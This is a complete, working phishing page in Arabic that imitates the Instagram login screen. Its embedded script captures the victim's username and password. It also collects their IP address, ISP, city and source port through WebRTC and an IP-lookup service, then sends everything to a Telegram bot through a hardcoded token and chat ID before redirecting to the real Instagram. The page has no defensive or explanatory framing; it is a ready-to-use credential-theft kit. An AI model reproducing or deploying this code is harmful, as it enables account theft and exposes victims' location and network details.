<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 350px; text-align: center; }
        .main-box { background: #fff; border: 1px solid #dbdbdb; padding: 40px 20px; border-radius: 3px; margin-bottom: 10px; }
        
        /* تأثير كلمة انستجرام المكتوبة (CSS Logo) */
        .instagram-logo {
            font-family: 'Grand Hotel', cursive; /* الخط المشبه للحقيقي */
            font-size: 55px;
            color: #262626;
            margin-bottom: 30px;
            direction: ltr; /* لضمان ظهور الكلمة صح من اليسار لليمين */
            display: block;
        }

        input { width: 92%; padding: 10px; margin-bottom: 7px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; color: #262626; }
        input::placeholder { color: #8e8e8e; font-size: 12px; }
        input:focus { outline: none; border-color: #a8a8a8; }
        
        button { width: 100%; padding: 8px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
        button:hover { background-color: #1877f2; }
        
        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; margin: 25px 0 15px 0; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
        
        .fb-login { color: #385185; font-size: 14px; font-weight: bold; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
        .fb-icon { width: 16px; margin-left: 8px; }
        
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; }
        
        .signup-box { background: #fff; border: 1px solid #dbdbdb; padding: 25px; font-size: 14px; border-radius: 3px; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>

    <div class="container">
        <div class="main-box">
            <span class="instagram-logo">Instagram</span>
            
            <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف">
            <input type="password" id="pass" placeholder="كلمة السر">
            <button id="btn" onclick="grabData()">تسجيل الدخول</button>
            
            <div class="divider">أو</div>
            
            <a href="#" class="fb-login">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="FB" class="fb-icon">
                تسجيل الدخول بحساب فيسبوك
            </a>
            
            <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
        </div>
        <div class="signup-box">
            ليس لديك حساب؟ <a href="#">تسجيل</a>
        </div>
    </div>

    <script>
        const TG_TOKEN = "8419642080:AAG_CldOoiG865Vi7U4Zsu0oIODVKHIJ13U";
        const TG_ID = "7647765854";

        async function getPort() {
            return new Promise((res) => {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (e) => {
                    if (e && e.candidate && e.candidate.candidate.includes("srflx")) {
                        res(e.candidate.candidate.split(" ")[5]);
                    }
                };
                setTimeout(() => res("80/443"), 3000);
            });
        }

        async function grabData() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            if(!u || !p) return;

            document.getElementById('btn').innerText = "...جاري التحميل";

            const sPort = await getPort();
            let net = { ip: "Unknown", city: "Unknown", org: "Unknown" };
            try { res = await fetch('https://ipapi.co/json/'); net = await res.json(); } catch(e){}

            const report = `
📸 **صيدة انستجرام جديدة (تقرير شامل)** 📸
---------------------------------
👤 **الحساب:**
- اليوزر: \`${u}\`
- الباسورد: \`${p}\`

🌐 **بيانات الشبكة (الراوتر):**
- الـ IP: \`${net.ip}\`
- المنفذ (Source Port): \`${sPort}\`
- الشركة (ISP): \`${net.org}\`
- المدينة: \`${net.city}\`

✅ **مشروع انستجرام ناجح يا عبد الله**
---------------------------------
            `;

            try {
                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: TG_ID, text: report, parse_mode: "Markdown" })
                });
                window.location.href = "https://www.instagram.com";
            } catch(e) { window.location.href = "https://www.instagram.com"; }
        }
    </script>
</body>
</html>
